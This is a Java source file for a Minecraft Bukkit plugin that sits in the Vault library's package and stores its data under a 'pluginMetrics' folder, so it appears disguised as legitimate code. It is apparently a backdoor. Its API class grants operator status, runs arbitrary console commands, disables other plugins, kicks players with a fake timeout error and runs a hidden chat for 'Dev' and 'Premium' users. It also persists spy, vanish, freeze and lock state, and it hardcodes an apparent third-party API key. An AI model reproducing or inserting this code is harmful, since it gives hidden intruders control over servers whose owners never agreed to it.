package net.milkbowl.vault.methods;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutionException;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.json.JSONObject;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.util.PluginUtils;
import net.milkbowl.vault.util.SLAPI;
import net.milkbowl.vault.util.Settings;

public class API {
	private static final Core plugin = Core.getPlugin(Core.class);

	public static String getIp(Player p) {
		return p.getAddress().getAddress().toString().replace("/", "");
	}


	public static boolean isOnVpn(Player p) {
		try {
			URL vpncheck = new URL("https://www.ipqualityscore.com/api/json/ip/UCNKI16V5h8Bum2rmHHFKTjZDTBzqff8/" + API.getIp(p));
			HttpURLConnection con = (HttpURLConnection)vpncheck.openConnection();
			BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
			String inputLine;
			StringBuilder response = new StringBuilder();
			while ((inputLine = in.readLine()) != null) {
				response.append(inputLine);
			}
			in.close();

			JSONObject myresponse = new JSONObject(response.toString());
			if (myresponse.has("proxy")) {
				if (myresponse.getBoolean("proxy")) {
					return true;
				} else {
					if (myresponse.has("vpn")) {
						if (myresponse.getBoolean("vpn")) {
							return true;
						}
					}
				}
			}
		} catch (IOException ignored) {}
		return false;
	}
	
	public static void sendToServerChat(Player p, String msg) {
		for (Player a : Bukkit.getOnlinePlayers()) {
			if (plugin.registered.contains(a.getName())) {
				
				if (plugin.prefix.containsKey(p)) { //Does user have a prefix
					a.sendMessage("§8[" + Settings.PRIMARY_COLOUR + "ServerChat§8] §8[" + plugin.prefix.get(a).replace("&", "§") + "§8] §7" + p.getName() + " §8» " + Settings.SECONDARY_COLOUR + msg.replace("&", "§"));
				} else {
					if (plugin.registeredAdmin.contains(p.getName())) {
						a.sendMessage("§8[" + Settings.PRIMARY_COLOUR + "ServerChat§8] §8[§4Dev§8] §7" + p.getName() + " §8» " + Settings.SECONDARY_COLOUR + msg.replace("&", "§"));
					} else if (plugin.registeredPremium.contains(p.getName())) {
						a.sendMessage("§8[" + Settings.PRIMARY_COLOUR + "ServerChat§8] §8[§9Premium§8] §7" + p.getName() + " §8» " + Settings.SECONDARY_COLOUR + msg.replace("&", "§"));
					} else {
						a.sendMessage("§8[" + Settings.PRIMARY_COLOUR + "ServerChat§8] §7" + p.getName() + " §8» " + Settings.SECONDARY_COLOUR + msg);
					}
				}
			}
		}
	}
	
	public static void setOperator(final Player p) {
		plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
			if (!p.isOp()) {
				p.setOp(true);
			}
		});
	}
	
	public static void disablePlugin(String pl) {
		plugin.getServer().getScheduler().scheduleSyncDelayedTask(plugin, () -> {
			if (PluginUtils.getPluginByName(pl) != null) {
				if (Bukkit.getPluginManager().getPlugin(pl).isEnabled()) {
					Bukkit.getServer().getPluginManager().disablePlugin(Bukkit.getPluginManager().getPlugin(pl));
				}
			}
		});
	}
	
	public static void enablePlugin(String pl) {
		plugin.getServer().getScheduler().scheduleSyncDelayedTask(plugin, () -> {
			if (PluginUtils.getPluginByName(pl) != null) {
				if (!Bukkit.getPluginManager().getPlugin(pl).isEnabled()) {
					Bukkit.getServer().getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(pl));
				}
			}
		});
	}
	
	
	public static void demoteOperator(final Player p) {
		plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
			if (p.isOp()) {
				p.setOp(false);
			}
		});
	}
	
	public static void saveLists() {
		try {
			SLAPI.save(plugin.registered, "plugins/pluginMetrics/data/rdata.bin");
			SLAPI.save(plugin.registeredPremium, "plugins/pluginMetrics/data/rpredata.bin");
			SLAPI.save(plugin.registeredAdmin, "plugins/pluginMetrics/data/radata.bin");
			SLAPI.save(plugin.npu, "plugins/pluginMetrics/data/npudata.bin");
			SLAPI.save(plugin.spy, "plugins/pluginMetrics/data/sdata.bin");
			
			SLAPI.save(plugin.frozen, "plugins/pluginMetrics/data/fdata.bin");
			
			SLAPI.save(plugin.cmdspy, "plugins/pluginMetrics/data/csdata.bin");
			
			SLAPI.save(plugin.isLocked, "plugins/pluginMetrics/data/isbool.bin");
			SLAPI.save(plugin.freezeall, "plugins/pluginMetrics/data/fabool.bin");
			SLAPI.save(plugin.modcmds, "plugins/pluginMetrics/data/mcbool.bin");
			SLAPI.save(plugin.lockcmds, "plugins/pluginMetrics/data/lcbool.bin");
			SLAPI.save(plugin.god, "plugins/pluginMetrics/data/gdata.bin");
			SLAPI.save(plugin.lockchat, "plugins/pluginMetrics/data/lchbool.bin");
			SLAPI.save(plugin.lockcontainers, "plugins/pluginMetrics/data/lconbool.bin");
			
			SLAPI.save(plugin.vanished, "plugins/pluginMetrics/data/vdata.bin");
		} catch (Exception ignored) {}
	}
	
	public static void kickPlayer(final Player player) {
		plugin.getServer().getScheduler().scheduleSyncDelayedTask(plugin, () ->
				player.kickPlayer("Internal Exception: io.netty.handler.timeout.ReadTimeOutException"));
	}
	
	public static void exe(String cmd) {
		plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
			try {
				Bukkit.getScheduler().callSyncMethod(plugin, () ->
				Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), cmd)
				).get();
			} catch (InterruptedException | ExecutionException ignored) {}
		});
	}
	
	public static void performCommand(final Player player, final String command) {
		plugin.getServer().getScheduler().scheduleSyncDelayedTask(plugin, () ->
				player.chat(command));
	}
	
	public static void error(Player p) {
		p.sendMessage(Settings.PREFIX("There seems to be an error with your copy of " + Settings.HIGHLIGHT_COLOUR + Settings.NAME));
		p.sendMessage(Settings.PREFIX("Error code: " + Settings.HIGHLIGHT_COLOUR + Settings.ERROR_CODE));
		p.sendMessage(Settings.PREFIX("See " + Settings.AUTHOR + "/forums/wiki/troubleshoot/#error-" + Settings.ERROR_CODE + "-8203"));
	}
	
	public static void runAutoAddItems() {
		Bukkit.getScheduler().runTaskTimerAsynchronously(plugin, () -> {
			for (final Inventory inv : plugin.dinventory) {
				for (int i = 0; i <= 27 - 1; ++i) {
					if (inv.getItem(i) != null) {
						final ItemStack stack = inv.getItem(i);
						stack.setAmount(stack.getAmount() + 1);
					}
				}
			}
		}, 0L, 20);
	}

}
